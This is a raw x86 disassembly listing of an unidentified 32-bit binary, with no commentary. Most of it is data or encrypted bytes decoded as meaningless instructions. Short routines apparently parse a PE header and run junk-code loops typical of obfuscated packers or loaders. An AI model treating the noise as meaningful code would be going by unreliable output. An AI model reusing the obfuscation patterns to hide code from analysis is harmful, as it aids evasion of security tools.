  4112b0:	hlt    
  4112b1:	adc    DWORD PTR [edx],0x2b093ada
  4112b7:	sbb    al,0x1b
  4112b9:	push   esp
  4112ba:	dec    edi
  4112bb:	mov    ah,0x78
  4112bd:	pop    es
  4112be:	pusha  
  4112bf:	enter  0xe95b,0xa4
  4112c3:	inc    edi
  4112c4:	cwde   
  4112c5:	rcl    DWORD PTR [esi-0x4e],0xa1
  4112c9:	mov    edx,0xaf58c877
  4112ce:	cld    
  4112cf:	pop    esi
  4112d0:	jbe    0x411265
  4112d2:	aaa    
  4112d3:	test   al,0x90
  4112d5:	mov    ?,WORD PTR [ebx-0x59]
  4112d8:	hlt    
  4112d9:	sub    eax,0x4e868847
  4112de:	addr16 ret 0xaeb9
  4112e2:	push   ss
  4112e3:	cmp    al,0x54
  4112e5:	sbb    DWORD PTR [edi],0xf
  4112e8:	test   dh,bh
  4112ea:	add    al,BYTE PTR [eax]
  4112ec:	add    bh,al
  4112ee:	inc    ebp
  4112ef:	call   0x7471083
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0xfa68f61e,eax
  411318:	adc    BYTE PTR [ecx+0x6a],dl
  41131b:	dec    ecx
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x4112e3
  411324:	call   0xcff8:0xcfcadbcd
  41132b:	add    al,0xf1
  41132d:	ficom  DWORD PTR [eax]
  41132f:	mov    cl,BYTE PTR [esi+ebp*2-0x3114afde]
  411336:	add    DWORD PTR [edx-0x80],0x835d7bec
  41133d:	mov    edx,0x1e87482f
  411342:	dec    edi
  411343:	repnz test DWORD PTR [ebp+0x1],ebx
  411347:	das    
  411348:	jl     0x41137f
  41134a:	stos   BYTE PTR es:[edi],al
  41134b:	adc    eax,0xb1fa2b8f
  411350:	fidivr WORD PTR [eax+0x6c634189]
  411356:	in     al,0xb5
  411358:	(bad)  
  411359:	mov    esp,0xbbea8142
  41135e:	int3   
  41135f:	push   ds
  411360:	sar    DWORD PTR fs:[ecx-0x62],cl
  411364:	(bad)  
  411365:	mov    ds:0xad4b9ec5,eax
  41136a:	dec    ecx
  41136b:	in     al,dx
  41136c:	es pushf 
  41136e:	xchg   ebx,eax
  41136f:	lea    eax,[edx+eax*2]
  411372:	les    ebx,FWORD PTR [edi-0x34]
  411375:	sbb    al,0x83
  411377:	xor    bh,BYTE PTR [ebx]
  411379:	mov    bl,0x31
  41137c:	addr16 cmp eax,esp
  41137f:	mov    eax,ds:0xedc8e9be
  411384:	sbb    cl,BYTE PTR [esi-0x47]
  411387:	dec    esi
  411388:	jecxz  0x41133a
  41138a:	push   0x6adddec0
  41138f:	mov    ah,0x1a
  411391:	xlat   BYTE PTR ds:[ebx]
  411392:	dec    esp
  411393:	popa   
  411394:	xlat   BYTE PTR ds:[ebx]
  411395:	xor    DWORD PTR [ebx+0x2e],ebp
  411398:	dec    ecx
  411399:	or     cl,ch
  41139b:	call   0x745ae7bf
  4113a0:	mov    ch,0x98
  4113a2:	rcl    eax,1
  4113a4:	dec    BYTE PTR [esp+ecx*4-0x39]
  4113a8:	sahf   
  4113a9:	imul   edx,DWORD PTR [eax],0x25
  4113ac:	xor    al,0x98
  4113ae:	mov    edx,DWORD PTR [esi-0x6101d2fc]
  4113b4:	(bad)  
  4113b5:	retf   
  4113b6:	mov    dh,BYTE PTR [edx+ebp*4-0x5d0f4c71]
  4113bd:	inc    edx
  4113be:	mov    BYTE PTR [edi],cl
  4113c0:	int    0x0
  4113c2:	xrelease mov DWORD PTR [ecx],ebx
  4113c5:	sub    ebx,DWORD PTR [eax+0x7b]
  4113c8:	pop    eax
  4113c9:	dec    esp
  4113ca:	cmp    ebx,DWORD PTR ss:[ebx]
  4113cd:	(bad)  
  4113ce:	xchg   esi,eax
  4113cf:	sbb    BYTE PTR [edi-0x7c],dh
  4113d2:	xor    eax,0x8a8e5248
  4113d7:	dec    edi
  4113d8:	xor    edi,ebp
  4113da:	pop    ebx
  4113db:	lea    edx,[ecx]
  4113dd:	sbb    dh,BYTE PTR [edx-0x7f]
  4113e0:	cmp    eax,0xae34f541
  4113e5:	repnz in al,0xc7
  4113e8:	xor    DWORD PTR [ebx],esp
  4113ea:	jp     0x4113bd
  4113ec:	shl    BYTE PTR [ebx+0x7c84400e],0x21
  4113f3:	pusha  
  4113f4:	pop    es
  4113f5:	push   eax
  4113f6:	fwait
  4113f7:	xor    al,0x99
  4113f9:	out    dx,eax
  4113fa:	mov    bl,0xf0
  4113fc:	sub    al,0xb5
  4113fe:	push   ss
  4113ff:	jge    0x41144f
  411401:	outs   dx,BYTE PTR ds:[esi]
  411402:	xchg   edi,eax
  411403:	movaps xmm7,XMMWORD PTR [esi-0x72]
  411407:	sub    ecx,ebx
  411409:	and    dl,BYTE PTR [esi-0x60ddba58]
  41140f:	push   esp
  411410:	mov    al,0x68
  411412:	add    eax,0xd59fdb4d
  411417:	xchg   ebx,eax
  411418:	or     bl,BYTE PTR [eax]
  41141a:	dec    edx
  41141b:	sahf   
  41141c:	in     al,dx
  41141d:	addr16 retf 0xa779
  411421:	rcr    DWORD PTR [edx+0x3a526a1],1
  411427:	outs   dx,BYTE PTR ds:[esi]
  411428:	add    ebx,DWORD PTR [eax]
  41142a:	ins    BYTE PTR es:[edi],dx
  41142b:	or     BYTE PTR [edi-0x43],dl
  41142e:	push   esi
  41142f:	lods   al,BYTE PTR ds:[esi]
  411430:	sbb    eax,0x418d36c7
  411435:	les    edx,FWORD PTR [edx+0x1e]
  411438:	mov    eax,0x3bf6160c
  41143d:	cmp    al,dl
  41143f:	sub    ebp,DWORD PTR [edi+0x31]
  411442:	shl    DWORD PTR [ebp+0x4f1f638f],0x12
  411449:	aaa    
  41144a:	push   0xa9da2cb9
  41144f:	loopne 0x41144d
  411451:	ja     0x411402
  411453:	pop    ebx
  411454:	cli    
  411455:	dec    edi
  411456:	loopne 0x4114b9
  411458:	xchg   edi,eax
  411459:	int    0x6
  41145b:	jno    0x4113f6
  41145d:	mov    DWORD PTR [ebx-0x57],eax
  411460:	mov    al,BYTE PTR [eax]
  411462:	jp     0x4114a3
  411464:	add    al,0x25
  411466:	cmp    al,0x34
  411468:	inc    edi
  411469:	imul   ebp,eax,0xffffff89
  41146c:	or     ah,BYTE PTR [esi-0x16]
  41146f:	mov    ah,0x40
  411471:	mov    dl,0x98
  411473:	mov    esp,DWORD PTR [ebp+0x35]
  411476:	adc    dh,BYTE PTR [esp+ebp*1-0x8]
  41147a:	add    bh,cl
  41147c:	retf   
  41147d:	pop    ss
  41147e:	push   ss
  41147f:	stos   BYTE PTR es:[edi],al
  411480:	fisttp QWORD PTR [ecx-0x1184af6d]
  411486:	push   0x9c04139c
  41148b:	jp     0x411448
  41148d:	out    dx,eax
  41148e:	test   al,0xb8
  411490:	mov    WORD PTR [edi],gs
  411492:	das    
  411493:	push   ebp
  411494:	fiadd  WORD PTR [ebp-0x1c746e3d]
  41149a:	pop    edx
  41149b:	fistp  WORD PTR [ebp+0x2ee421e5]
  4114a1:	test   DWORD PTR ds:0x4649faf4,esi
  4114a7:	clc    
  4114a8:	je     0x411463
  4114aa:	cli    
  4114ab:	mov    ds:0x9efee2a8,al
  4114b0:	mov    DWORD PTR [edi],esp
  4114b2:	xchg   DWORD PTR [eax+0x5],ebp
  4114b5:	lods   al,BYTE PTR ds:[esi]
  4114b6:	sti    
  4114b7:	into   
  4114b8:	add    DWORD PTR [edi-0xd],0x78
  4114bc:	dec    edx
  4114bd:	inc    eax
  4114be:	mov    WORD PTR [esi-0x36],gs
  4114c1:	ss hlt 
  4114c3:	out    0x19,al
  4114c5:	inc    edx
  4114c6:	leave  
  4114c7:	pop    ebx
  4114c8:	inc    ebp
  4114c9:	aas    
  4114ca:	push   esp
  4114cb:	inc    DWORD PTR [edx-0x7a842306]
  4114d1:	adc    eax,0xf1d3c6e2
  4114d6:	cmp    al,0xa2
  4114d8:	outs   dx,DWORD PTR ds:[esi]
  4114d9:	sub    ecx,DWORD PTR [ebx+0x270230dc]
  4114df:	ja     0x411489
  4114e1:	fwait
  4114e2:	jb     0x41150d
  4114e4:	xchg   ecx,eax
  4114e5:	push   ds
  4114e6:	add    DWORD PTR [edi+esi*4],0x4a
  4114ea:	sub    ah,BYTE PTR [eax+0x4c594423]
  4114f0:	inc    edi
  4114f1:	mov    dh,0xc1
  4114f3:	(bad)  
  4114f4:	pop    eax
  4114f5:	jbe    0x4114da
  4114f7:	je     0x411533
  4114f9:	push   edx
  4114fa:	inc    edx
  4114fb:	les    eax,FWORD PTR [esi+ecx*1+0x36e888c1]
  411502:	mov    ebx,0xe7291626
  411507:	xor    bh,BYTE PTR [esi-0x2761baa3]
  41150d:	dec    eax
  41150e:	ret    
  41150f:	mov    ecx,0xbe30f337
  411514:	xor    BYTE PTR [ebx-0x7f913b00],dl
  41151a:	ja     0x41153e
  41151c:	xchg   eax,esp
  41151e:	push   0x7e8af0c0
  411523:	dec    esi
  411524:	fdivr  DWORD PTR [edi+0x4f6483c]
  41152a:	xchg   DWORD PTR [edx+0x38],ebx
  41152d:	out    0xd7,al
  41152f:	fsub   st,st(1)
  411531:	cmp    edi,DWORD PTR [ebx]
  411533:	adc    BYTE PTR [ecx+0x7a],0xe5
  411537:	dec    esp
  411538:	lods   eax,DWORD PTR ds:[esi]
  411539:	lods   eax,DWORD PTR ds:[esi]
  41153a:	xlat   BYTE PTR ds:[ebx]
  41153b:	push   edx
  41153c:	loopne 0x411522
  41153e:	in     al,0x4d
  411540:	ret    
  411541:	xchg   DWORD PTR ds:0x32b5099d,edi
  411547:	cmp    BYTE PTR [ebx+0x5c],0x6f
  41154b:	sbb    al,0x85
  41154d:	pop    ebx
  41154e:	repnz sub ecx,DWORD PTR [ecx]
  411551:	aas    
  411552:	push   ds
  411553:	mov    eax,0x85638f9e
  411558:	cmp    eax,edi
  41155a:	cmc    
  41155b:	mov    ds:0x5b47f58e,eax
  411560:	fstp   DWORD PTR [edx]
  411562:	cmp    bl,BYTE PTR [eax-0x78b59f2a]
  411568:	and    al,0xe
  41156a:	push   es
  41156b:	lds    esp,FWORD PTR [ecx-0x7f]
  41156e:	loope  0x4115e3
  411570:	add    eax,DWORD PTR [eax+0x76]
  411573:	(bad)  
  411574:	(bad)  [ebx+0x7f931de]
  41157a:	jo     0x41154a
  41157c:	mov    ds:0x67ab5aeb,al
  411581:	mov    cl,0x1d
  411583:	sbb    al,0x92
  411585:	or     al,0xaa
  411587:	adc    BYTE PTR [ebx+0x7b1babed],dh
  41158d:	jge    0x41154a
  41158f:	jne    0x41158b
  411591:	outs   dx,DWORD PTR ds:[esi]
  411592:	fbld   TBYTE PTR [esi]
  411594:	aaa    
  411595:	daa    
  411596:	iret   
  411597:	lock xor eax,0xc1ef5b36
  41159d:	mov    ebp,0x1dfc361a
  4115a2:	jle    0x41158a
  4115a4:	sbb    eax,0xfa801da4
  4115a9:	mov    al,ds:0x78216ad3
  4115ae:	div    DWORD PTR [eax+0x3b491221]
  4115b4:	aaa    
  4115b5:	add    DWORD PTR [eax-0x8],esi
  4115b8:	or     al,0xad
  4115ba:	jbe    0x8d2a5522
  4115c0:	xor    al,0xe8
  4115c2:	dec    esi
  4115c3:	cs popa 
  4115c5:	jno    0x4115df
  4115c7:	loopne 0x411561
  4115c9:	mov    esp,0xf8e0c584
  4115ce:	mov    ch,0x68
  4115d0:	dec    esi
  4115d1:	mov    esi,0x558bf76a
  4115d6:	or     BYTE PTR [ebx],dh
  4115d8:	ror    DWORD PTR [ebp+0x729b1084],0x32
  4115df:	add    BYTE PTR [ecx+0x45ff0845],cl
  4115e5:	or     al,0xe9
  4115e7:	sti    
  4115e8:	stc    
  4115e9:	(bad)  
  4115ea:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	ins    BYTE PTR es:[edi],dx
  411619:	adc    eax,0x408690d9
  41161e:	jle    0x41169e
  411620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411621:	jg     0x4116a1
  411623:	jle    0x411614
  411625:	sbb    eax,0xfe8fc679
  41162a:	sahf   
  41162b:	jno    0x411679
  41162d:	(bad)  
  41162e:	mov    ds:0xbc405a65,al
  411633:	enter  0xc9db,0xb5
  411637:	(bad)  
  411638:	cmp    DWORD PTR [ebp+ebp*4+0x2e],esi
  41163c:	sbb    esp,edi
  41163e:	adc    eax,0x8044192e
  411643:	sbb    esi,DWORD PTR [edx]
  411645:	lock pop esp
  411647:	jp     0x4116a8
  411649:	rol    DWORD PTR [edx+0x25],cl
  41164c:	into   
  41164d:	mov    esi,0xd0cd4f00
  411652:	xlat   BYTE PTR ds:[ebx]
  411653:	std    
  411654:	xchg   ecx,eax
  411655:	mov    ah,0xfa
  411657:	stos   DWORD PTR es:[edi],eax
  411658:	lahf   
  411659:	or     esi,esp
  41165b:	out    dx,eax
  41165c:	jmp    0xd4348ccc
  411661:	sub    BYTE PTR [edx],ch
  411663:	add    al,0xd
  411665:	pusha  
  411666:	or     BYTE PTR [edi],0x45
  411669:	pop    ecx
  41166a:	mov    ah,0x57
  41166c:	sub    al,cl
  41166e:	sbb    esp,ebp
  411670:	(bad)  
  411671:	sub    al,0x8f
  411673:	jno    0x41165c
  411675:	sub    DWORD PTR [ebx+0x4e],edx
  411678:	xchg   esp,eax
  411679:	and    DWORD PTR [eax+0x2f],esi
  41167c:	inc    edi
  41167d:	mov    al,BYTE PTR [eax-0x1f]
  411680:	call   0x6438:0x48803334
  411687:	fiadd  DWORD PTR [ebx+0x5d]
  41168a:	pusha  
  41168b:	pop    ebx
  41168c:	test   DWORD PTR [ebx+0x43],eax
  41168f:	pushf  
  411690:	rcr    BYTE PTR [ecx+0x1f28ef02],cl
  411696:	daa    
  411697:	jge    0x411652
  411699:	loope  0x411633
  41169b:	fnstcw WORD PTR es:[ebp+0x67]
  41169f:	test   DWORD PTR [ebp+0x75],ebx
  4116a2:	in     eax,0x92
  4116a4:	das    
  4116a5:	std    
  4116a6:	inc    ebx
  4116a7:	and    BYTE PTR [ebx],ah
  4116a9:	popa   
  4116aa:	sub    dh,BYTE PTR [edx]
  4116ac:	lds    eax,FWORD PTR [esi+0x7c907f6]
  4116b2:	dec    edx
  4116b3:	call   0x2b671929
  4116b8:	loop   0x4116b1
  4116ba:	xchg   edx,eax
  4116bb:	rcr    BYTE PTR [esi-0x5a],cl
  4116be:	inc    edx
  4116bf:	cwde   
  4116c0:	(bad)  
  4116c1:	xchg   edx,eax
  4116c2:	push   cs
  4116c3:	sub    ebp,eax
  4116c5:	popa   
  4116c6:	sbb    ch,0xbe
  4116c9:	ror    BYTE PTR [ebx-0x6b],0x49
  4116cd:	xchg   BYTE PTR [ebp+ecx*1+0x65390b],cl
  4116d4:	inc    ebx
  4116d5:	or     al,0xcc
  4116d7:	mov    edi,0x480bc79
  4116dc:	sbb    BYTE PTR [edx],bl
  4116de:	(bad)  
  4116e0:	icebp  
  4116e1:	ins    BYTE PTR es:[edi],dx
  4116e2:	xor    eax,0x45ef2c8c
  4116e7:	xor    eax,0x61fe4b1
  4116ec:	and    esi,DWORD PTR [eax+0x6a]
  4116ef:	mov    BYTE PTR [ebp*4-0x421821f4],bh
  4116f6:	adc    eax,0x62d8567
  4116fb:	add    esi,esi
  4116fd:	xchg   BYTE PTR [edx],cl
  4116ff:	(bad)  
  411700:	es push es
  411702:	mov    ebp,DWORD PTR [eax+ebx*8]
  411705:	inc    ecx
  411706:	in     al,0xf0
  411708:	mov    ebx,0xe49b6799
  41170d:	sbb    esi,DWORD PTR [ebx+eax*2-0x10]
  411711:	aaa    
  411712:	push   ds
  411713:	mov    DWORD PTR [eax],esi
  411715:	mov    ebp,0x7251832a
  41171b:	add    ebp,edi
  41171d:	or     al,0xd1
  41171f:	or     DWORD PTR [ecx-0x75],edi
  411722:	and    BYTE PTR [esi],bl
  411724:	inc    eax
  411725:	push   ebp
  411726:	dec    edx
  411727:	out    dx,eax
  411728:	mov    al,ds:0x8b1f4ba7
  41172d:	fdivr  QWORD PTR [ebp-0x6c]
  411730:	sub    al,0x53
  411732:	(bad)  
  411733:	stos   DWORD PTR es:[edi],eax
  411734:	xlat   BYTE PTR ds:[ebx]
  411735:	pop    ebx
  411736:	sub    eax,0x69e5019d
  41173b:	pusha  
  41173c:	retf   
  41173d:	inc    edx
  41173e:	pop    edx
  41173f:	mov    eax,ds:0x941c0bd
  411744:	push   es
  411745:	adc    eax,0x9e892a59
  41174a:	pop    ss
  41174b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41174c:	push   ebp
  41174d:	and    ebx,DWORD PTR [ecx+0x3f42a4ac]
  411753:	push   esp
  411754:	dec    edi
  411755:	sub    edi,DWORD PTR [ecx]
  411757:	shl    DWORD PTR [eax+eiz*4],0x5d
  41175b:	fldcw  WORD PTR [edi+edx*8+0x5c61cfa1]
  411762:	stos   DWORD PTR es:[edi],eax
  411763:	sub    al,0x35
  411765:	js     0x4117de
  411767:	mov    esp,0x1725dc57
  41176c:	fdivr  QWORD PTR [edx-0x35092eb6]
  411772:	sub    al,0x4a
  411774:	xchg   DWORD PTR [ecx],ebx
  411776:	xchg   edi,eax
  411777:	stc    
  411778:	push   ebx
  411779:	aaa    
  41177a:	jg     0x411734
  41177c:	jne    0x4117f2
  41177e:	xchg   ebx,eax
  41177f:	int    0xac
  411781:	mov    bl,0xdb
  411783:	in     eax,dx
  411784:	(bad)  
  411786:	xor    ah,BYTE PTR [edx]
  411788:	xor    al,BYTE PTR ds:0xb2198b6a
  41178e:	outs   dx,BYTE PTR ds:[esi]
  41178f:	test   DWORD PTR [edi-0x5b5b17d5],eax
  411795:	in     al,0x53
  411797:	retf   0x2686
  41179a:	cmp    eax,0x918cb5a5
  41179f:	(bad)  
  4117a0:	(bad)  
  4117a1:	stos   DWORD PTR es:[edi],eax
  4117a2:	xchg   DWORD PTR ds:0x219876e,ebp
  4117a8:	ja     0x4117f2
  4117aa:	and    ah,bl
  4117ac:	mov    dh,0x56
  4117ae:	jg     0x41174f
  4117b0:	or     eax,DWORD PTR [ebp+esi*2-0x8]
  4117b4:	sbb    al,0x5e
  4117b6:	sar    DWORD PTR [eax+0x16],cl
  4117b9:	dec    ebp
  4117ba:	push   cs
  4117bb:	cmp    DWORD PTR [ecx+0x1],0x24d9e2eb
  4117c2:	pop    es
  4117c3:	push   cs
  4117c4:	jne    0x41177d
  4117c6:	pop    esi
  4117c7:	inc    ecx
  4117c8:	idiv   DWORD PTR [eax+0x4b]
  4117cb:	cmp    ebx,DWORD PTR [ebx+eax*1]
  4117ce:	mov    eax,DWORD PTR [ebp+0x8]
  4117d1:	mov    DWORD PTR ds:0x4336a3,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x4335ff,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43369f,0x433603
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43369f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43361b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4336ab,0x0
  41182f:	mov    eax,ds:0x4336ab
  411834:	inc    eax
  411835:	mov    ds:0x4336ab,eax
  41183a:	cmp    DWORD PTR ds:0x4336ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4337bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4336ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4336ab
  411899:	inc    eax
  41189a:	mov    ds:0x4336ab,eax
  41189f:	cmp    DWORD PTR ds:0x4336ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	inc    edi
  4118e8:	xchg   edi,eax
  4118e9:	cdq    
  4118ea:	std    
  4118eb:	sub    al,0x4e
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x41189b
  4118f4:	daa    
  4118f5:	test   eax,0xb6799687
  4118fa:	sbb    BYTE PTR [esi+0x55d46740],ah
  411900:	mov    dh,0xe1
  411902:	rol    BYTE PTR [ecx+0x2],0x7b
  411906:	mov    bh,0x87
  411908:	fild   DWORD PTR [ecx+0x7a9a934]
  41190e:	mov    ebp,0x68a5c852
  411913:	mov    eax,0x1a4663fb
  411918:	adc    eax,0xa2aea92
  41191d:	mov    cl,0x14
  41191f:	js     0x411951
  411921:	inc    ebp
  411922:	popa   
  411923:	(bad)  
  411924:	mov    dh,0x90
  411926:	fsubr  QWORD PTR [esi]
  411928:	dec    ebx
  411929:	adc    DWORD PTR [ecx+0x418a2cab],ebp
  41192f:	call   0xf645:0xdb3f7221
  411936:	ss (bad) 
  411938:	push   edx
  411939:	arpl   WORD PTR [esi],bx
  41193b:	or     eax,0x8c184eac
  411940:	mov    gs,WORD PTR [ebx+0x17]
  411943:	cwde   
  411944:	cmc    
  411945:	mov    cl,0xd3
  411947:	push   0xb7244fce
  41194c:	mov    esp,0x5162cca3
  411951:	and    BYTE PTR [edx-0x3d8962ed],dl
  411957:	xor    ecx,DWORD PTR [eax+0x41a579ab]
  41195d:	test   BYTE PTR [ecx+0x29],0x5e
  411961:	sbb    bl,BYTE PTR [ebp-0x45]
  411964:	sbb    al,0xa1
  411966:	in     al,dx
  411967:	cdq    
  411968:	cmp    cl,BYTE PTR [eax+0x308655fe]
  41196e:	loope  0x41199b
  411970:	mov    dl,BYTE PTR [edx-0x72a67e5c]
  411976:	jnp    0x4119cf
  411978:	ins    DWORD PTR es:[edi],dx
  411979:	loope  0x41193a
  41197b:	and    BYTE PTR [edx+ebp*8-0x3a17234f],bl
  411982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411983:	or     bh,BYTE PTR [edx-0x22af2171]
  411989:	cmp    al,dl
  41198b:	or     al,0x90
  41198d:	or     eax,0x58b742e1
  411992:	mov    ds:0x505f02f,al
  411997:	cmp    DWORD PTR [ebp+0x1d],esp
  41199a:	adc    esp,ebp
  41199c:	jp     0x4119dc
  41199e:	idiv   ecx
  4119a0:	lods   al,BYTE PTR fs:[esi]
  4119a2:	add    eax,0xefa879d
  4119a7:	loopne 0x41194f
  4119a9:	adc    DWORD PTR [esi],ecx
  4119ab:	or     BYTE PTR [eax],dl
  4119ad:	shr    esp,cl
  4119af:	pusha  
  4119b0:	cmc    
  4119b1:	push   es
  4119b2:	mov    cl,0x78
  4119b4:	and    bl,al
  4119b6:	and    eax,0x88bb1a14
  4119bb:	daa    
  4119bc:	jno    0x411a1d
  4119be:	cwde   
  4119bf:	mov    bl,0x2d
  4119c1:	(bad)  
  4119c2:	sbb    eax,0xe85aed37
  4119c7:	aad    0xab
  4119c9:	dec    eax
  4119ca:	repnz mov esi,0x984e703c
  4119d0:	jle    0x411994
  4119d2:	ret    0xa289
  4119d5:	inc    edi
  4119d6:	retf   0x615a
  4119d9:	mov    bl,0x6e
  4119db:	add    al,0x71
  4119dd:	sub    al,0xa7
  4119df:	mov    bl,0x29
  4119e1:	into   
  4119e2:	stc    
  4119e3:	sub    eax,ebx
  4119e5:	aam    0x90
  4119e7:	cmc    
  4119e8:	push   ebp
  4119e9:	mov    DWORD PTR [eax+0x3c],ebp
  4119ec:	lds    edi,FWORD PTR [ebp+0x6]
  4119ef:	mov    ah,0x98
  4119f1:	push   0xa6f6259d
  4119f6:	xchg   esp,eax
  4119f7:	jmp    0x4119b3
  4119f9:	cdq    
  4119fa:	mov    esp,edx
  4119fc:	xchg   esp,eax
  4119fd:	pop    esi
  4119fe:	scas   al,BYTE PTR es:[edi]
  4119ff:	inc    esi
  411a00:	push   esp
  411a01:	push   ebp
  411a02:	jmp    0x41199c
  411a04:	popa   
  411a05:	dec    ebx
  411a06:	jp     0x411a1a
  411a08:	rcl    DWORD PTR [ecx+esi*2-0x61b684d2],1
  411a0f:	(bad)  
  411a10:	rcl    DWORD PTR [ebx-0x288d07d3],cl
  411a16:	mov    ecx,DWORD PTR [edi+edx*1-0x196dd52e]
  411a1d:	not    DWORD PTR [esi-0x10]
  411a20:	pop    ss
  411a21:	loope  0x411a1e
  411a23:	jl     0x411a41
  411a25:	in     al,dx
  411a26:	aas    
  411a27:	mov    ecx,0xbc1e1817
  411a2c:	mov    ah,ch
  411a2e:	and    ebx,DWORD PTR [ebp+0x6e7dc924]
  411a34:	rol    BYTE PTR [ebx-0xc1af3eb],1
  411a3a:	sbb    eax,0x2eadd3b5
  411a3f:	lods   eax,DWORD PTR ds:[esi]
  411a40:	stc    
  411a41:	pushf  
  411a42:	retf   
  411a43:	ret    0x830d
  411a46:	jo     0x411a94
  411a48:	retf   0x5a21
  411a4b:	jns    0x411a3d
  411a4d:	int3   
  411a4e:	adc    al,dl
  411a50:	ins    DWORD PTR es:[edi],dx
  411a51:	inc    edi
  411a52:	scas   al,BYTE PTR es:[edi]
  411a53:	inc    eax
  411a54:	ror    DWORD PTR [edx+0x60],1
  411a57:	ficomp WORD PTR [edi+ebp*1]
  411a5a:	test   al,0x2e
  411a5c:	ret    0xb6ee
  411a5f:	and    BYTE PTR [esi+eiz*4],bl
  411a62:	fidivr DWORD PTR ds:0xd0d3d744
  411a68:	cmp    cl,BYTE PTR [eax+0x7e]
  411a6b:	lods   al,BYTE PTR ds:[esi]
  411a6c:	out    dx,eax
  411a6d:	(bad)  
  411a6e:	jg     0x411aea
  411a70:	inc    ecx
  411a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a72:	push   eax
  411a73:	mov    bl,dh
  411a75:	fisttp QWORD PTR [edi-0x1c40f216]
  411a7b:	mov    esp,es
  411a7d:	js     0x411a61
  411a7f:	cmp    al,0xd8
  411a81:	ds stos DWORD PTR es:[edi],eax
  411a83:	cmp    ebx,DWORD PTR [edi]
  411a85:	and    DWORD PTR [ecx-0x10230ef6],esp
  411a8b:	mov    eax,ds:0x9d7674e5
  411a90:	nop
  411a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a92:	cdq    
  411a93:	mov    DWORD PTR [ebp-0x378060e8],0x76abc5d3
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
